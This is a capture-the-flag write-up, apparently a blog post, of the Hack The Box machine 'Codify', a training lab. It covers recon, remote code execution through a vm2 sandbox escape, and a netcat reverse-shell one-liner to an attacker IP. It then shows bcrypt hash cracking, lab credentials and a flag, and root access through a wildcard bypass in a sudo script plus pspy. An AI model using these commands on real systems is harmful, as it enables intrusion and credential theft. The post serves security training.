---
image: "/assets/img/posts/Copie-de-Manager_1720a7d414.png"
title: "Codify Htb"
description: "Codify is a simple Linux machine that features a web application allowing users to test Node.js code. L"
pubDate: "2024-04-15"
author: "MrR0807"
categories: ["CTF"]
tags: ["cybersecurity", "writeup"]
pin: false
---
[The Best Academy to Learn Hacking](https://affiliate.hackthebox.com/nenandjabhata).[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1).


## Reconnaissance





To get started, I do a little scan on the Box with nmap





  `








```bash


└─# nmap -sV -Pn -p- --min-rate 3000 $ip


Host is up (0.76s latency).


Not shown: 65470 closed tcp ports (reset), 62 filtered tcp ports (no-response)


PORT     STATE SERVICE VERSION


22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)


80/tcp   open  http    Apache httpd 2.4.52


3000/tcp open  http    Node.js Express framework


Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel





```


`





I find a site in port 80 with the domain codify.htb so I will add it to /etc/hosts





  `








```bash


─# echo "$ip  $host" | tee -a /etc/hosts                                  


10.10.11.239  codify.htb





```


`





In the site I find that I am told that: The Codify platform allows users to describe and execute Node.js code online, but certain limitations are in place to guarantee the security of the platform and its users. Next, in the about I find an interesting line which indexes the Vm2 libray [![About](/assets/img/posts/vm2_9f28bbf9df.png)](https://i.ibb.co/qWLWFjX/vm2.png)





By clicking on the Link I find the github and also in Security I find 7 critical vulnerabilities, with the help of which I use this [issue](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac) to have an RCE.





[![RCE](/assets/img/posts/vm2_5c50dfa9f5.png)](https://i.ibb.co/9brxYL8/vm2.png)





By exploiting it and making an id I find uid=1001(svc) gid=1001(svc) groups=1001(svc)





Now, I'm going to create a reverse shell





  `








```bash


execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.5 1337 >/tmp/f").toString();





$sudo rlwrap nc -lnvp 1337                      


listening on [any] 1337 ...


connect to [10.10.14.5] from (UNKNOWN) [10.10.11.239] 37202


bash: cannot set terminal process group (1266): Inappropriate ioctl for device


bash: no job control in this shell


svc@codify:~$ id


id


uid=1001(svc) gid=1001(svc) groups=1001(svc)


svc@codify:~$





```


`


### Mouvement Lateral





In /home I find another user joshua. So I'm going to collect information about this user.





  `








```bash


svc@codify:/home$ ls


joshua svc





ls -la *


contact:


total 120


drwxr-xr-x 3 svc  svc   4096 Sep 12  2023 .


drwxr-xr-x 5 root root  4096 Sep 12  2023 ..


-rw-rw-r-- 1 svc  svc   4377 Apr 19  2023 index.js


-rw-rw-r-- 1 svc  svc    268 Apr 19  2023 package.json


-rw-rw-r-- 1 svc  svc  77131 Apr 19  2023 package-lock.json


drwxrwxr-x 2 svc  svc   4096 Apr 21  2023 templates


-rw-r--r-- 1 svc  svc  20480 Sep 12  2023 tickets.db





```


`





To do this I went to /var/www then in the /contact of the server I found a tickets.db





  `








```bash


sqlite3 tickets.db


SQLite version 3.37.2 2022-01-06 13:25:41


Enter ".help" for usage hints.


sqlite> .table.tables


.tables


tickets  users  


sqlite> SELECTSELECT * FROM users;


SELECT * FROM users;


3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2


sqlite>





```


`





So I find a hash of the user in question, so I'm going to use hashcat to crack it





  `








```bash


# hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt -o passwd.txt


hashcat (v6.2.6) starting





OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]


==================================================================================================================================================


* Device #1: cpu-haswell-Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, 2868/5800 MB (1024 MB allocatable), 8MCU


Session..........: hashcat


Status...........: Cracked


Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))


Hash.Target......: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLH.../p/Zw2


Time.Started.....: Mon Apr 15 02:26:15 2024 (42 secs)


Time.Estimated...: Mon Apr 15 02:26:57 2024 (0 secs)


Kernel.Feature...: Pure Kernel


Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)


Guess.Queue......: 1/1 (100.00%)


Speed.#1.........:       34 H/s (7.18ms) @ Accel:8 Loops:16 Thr:1 Vec:1


Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)


Progress.........: 1408/14344387 (0.01%)


Rejected.........: 0/1408 (0.00%)


Restore.Point....: 1344/14344387 (0.01%)


Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4080-4096


Candidate.Engine.: Device Generator


Candidates.#1....: rayray -> ranger


Hardware.Mon.#1..: Temp: 59c Util: 93%





$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1





```


`





Now, I will connect to ssh with this creds





## Privilege Escalation





I find a bash script that I can run with root.





  `








```bash


joshua@codify:~$ cat user.txt 


9612c3391fcd75f14ea72c6f06e57e3a


joshua@codify:~$ 


joshua@codify:~$ sudo -l


[sudo] password for joshua: 


Matching Defaults entries for joshua on codify:


    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty





User joshua may run the following commands on codify:


    (root) /opt/scripts/mysql-backup.sh





```


`





Okay, first I'll read the code and see what this script does.





  `








```bash


joshua@codify:~$ cat /opt/scripts/mysql-backup.sh


#!/bin/bash


DB_USER="root"


DB_PASS=$(/usr/bin/cat /root/.creds)


BACKUP_DIR="/var/backups/mysql"





read -s -p "Enter MySQL password for $DB_USER: " USER_PASS


/usr/bin/echo





if [[ $DB_PASS == $USER_PASS ]]; then


        /usr/bin/echo "Password confirmed!"


else


        /usr/bin/echo "Password confirmation failed!"


        exit 1


fi





/usr/bin/mkdir -p "$BACKUP_DIR"





databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")





for db in $databases; do


    /usr/bin/echo "Backing up database: $db"


    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"


done





/usr/bin/echo "All databases backed up successfully!"


/usr/bin/echo "Changing the permissions"


/usr/bin/chown root:sys-adm "$BACKUP_DIR"


/usr/bin/chmod 774 -R "$BACKUP_DIR"


/usr/bin/echo Done!





```


`





By launching this script with the root user, the script asks us for a password which is compared to that contained in /root/.creds. If it matches, it uses the password to connect to mysql and run some commands.





As it's a bash script we can try to bypass the password request with the * character to select everything and see





  `








```bash


joshua@codify:~$ sudo -u root /opt/scripts/mysql-backup.sh


Enter MySQL password for root: *


Password confirmed!


mysql: [Warning] Using a password on the command line interface can be insecure.


Backing up database: mysql


mysqldump: [Warning] Using a password on the command line interface can be insecure.


-- Warning: column statistics not supported by the server.


mysqldump: Got error: 1556: You cant use locks with log tables when using LOCK TABLES


mysqldump: Got error: 1556: You cant use locks with log tables when using LOCK TABLES


Backing up database: sys


mysqldump: [Warning] Using a password on the command line interface can be insecure.


-- Warning: column statistics not supported by the server.


All databases backed up successfully!


Changing the permissions


Done!





```


`





Here we can clearly see that everything is good and it is already executed but the problem is that we see the tasks carried out behind or the passwords which are entered. So We are going to use the pspy tool to see what is going on behind.





> pspy is a command line tool designed to spy on processes without needing root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. It is ideal for listing Linux systems in CTFs. It's also great for showing your colleagues why passing secrets as arguments on the command line is a bad idea.


  `








```bash


joshua@codify:/tmp/priv$ ./pspy64 -f


2024/04/15 02:42:20 CMD: UID=0    PID=2625   | /bin/bash /opt/scripts/mysql-backup.sh                                                                     


2024/04/15 02:42:20 CMD: UID=0    PID=2624   | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 sys





```


`





In the execute tasks I see a password used to connect to the mySQL database on port 3306. So I will try that to access the root user





[![Pwned](/assets/img/posts/pwned_d828888297.png)](https://i.ibb.co/stLG714/pwned.png)





## Ressources supplementaires





Here are some additional resources that might be helpful to you:





[Vm2 Issue](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)[Pspy](https://github.com/DominicBreuker/pspy)[Join Us on Discord](https://discord.gg/wBT9wr9ruG). Share        [](https://twitter.com/intent/tweet?text=Codify%20-%20HacktheBox%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fcodify-htb%2F)       [](https://www.facebook.com/sharer/sharer.php?title=Codify%20-%20HacktheBox%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&u=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fcodify-htb%2F)       [](https://t.me/share/url?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fcodify-htb%2F&text=Codify%20-%20HacktheBox%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE)       [](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fcodify-htb%2F)


